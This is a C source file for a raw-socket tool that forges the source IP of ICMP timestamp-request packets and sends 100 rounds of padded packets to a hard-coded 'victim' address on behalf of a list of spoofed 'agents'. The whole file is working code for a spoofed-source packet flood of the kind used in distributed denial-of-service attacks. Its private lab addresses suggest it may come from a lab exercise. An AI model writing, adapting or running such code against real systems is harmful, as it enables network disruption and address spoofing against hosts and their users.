#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <signal.h>

#define PAYLOAD_SIZE 1024
#define PAYLOAD_TEXT "who this?"


unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char*)buf;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;

    return result;
}


unsigned char *build_icmp_packet(const char *src_ip,struct in_addr dst_addr, unsigned short seq,size_t *out_len) 
  {
    size_t packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + PAYLOAD_SIZE;
    unsigned char *packet = malloc(packet_size);
    if (!packet) {
        perror("malloc");
        return NULL;
    }

    memset(packet, 0, packet_size);

    struct iphdr   *iph   = (struct iphdr *) packet;
    struct icmphdr *icmph = (struct icmphdr *) (packet + sizeof(struct iphdr));
    char *payload         = (char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));

    
    strncpy(payload, PAYLOAD_TEXT, PAYLOAD_SIZE - 1);

    
    iph->ihl      = 5;
    iph->version  = 4;
    iph->tos      = 0;
    iph->tot_len  = htons(packet_size);
    iph->id       = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl      = 255;
    iph->protocol = IPPROTO_ICMP;
    iph->saddr    = inet_addr(src_ip);
    iph->daddr    = dst_addr.s_addr;
    

    
    icmph->type  = 13;
    icmph->code  = 0;
    icmph->un.echo.sequence = htons(seq);
    icmph->un.echo.id       = rand();       
    icmph->checksum         = 0;
    icmph->checksum         = checksum((unsigned short *) icmph,
                                       sizeof(struct icmphdr) + PAYLOAD_SIZE);

    if (out_len) {
        *out_len = packet_size;
    }

    return packet;
}

int main() {
    int raw_sock;
    char *agents[] = {"10.0.0.1"};
    char victim[] = "10.0.0.2";        
    int rounds    = 100;                   

    int num_agents = sizeof(agents) / sizeof(agents[0]);
    printf("Agents total: %d\n", num_agents);

    struct sockaddr_in dest_addr;

   
    srand(time(NULL));

    
    raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    
    int on = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt IP_HDRINCL error");
        close(raw_sock);
        return 1;
    }

    if (setsockopt(raw_sock, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof(on)) == -1) {
        perror("setsockopt SO_BROADCAST error");
        close(raw_sock);
        return 1;
    }

    struct timeval timeout = {5, 0}; 
    if (setsockopt(raw_sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout)) == -1) {
        perror("setsockopt SO_RCVTIMEO error");
        close(raw_sock);
        return 1;
    }

    
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family      = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(victim);

    for (int r = 0; r < rounds; r++) {
        for (int i = 0; i < num_agents; i++) {
            size_t packet_len = 0;
            unsigned short seq = (unsigned short)(i * 100 + r);

            unsigned char *packet = build_icmp_packet(agents[i], dest_addr.sin_addr, seq, &packet_len);
            if (!packet) {
                fprintf(stderr, "Failed to build packet for agent %s\n", agents[i]);
                continue;
            }

            
            if (sendto(raw_sock,packet, packet_len,0,(struct sockaddr *) &dest_addr,sizeof(dest_addr)) < 0) {
                perror("Send failed");
                free(packet);
                close(raw_sock);
                exit(EXIT_FAILURE);
            }

            printf("%d ICMP packet sent from %s (round %d)\n",
                   i + 1, agents[i], r + 1);

            free(packet);
        }
    }

    close(raw_sock);
    return 0;
}
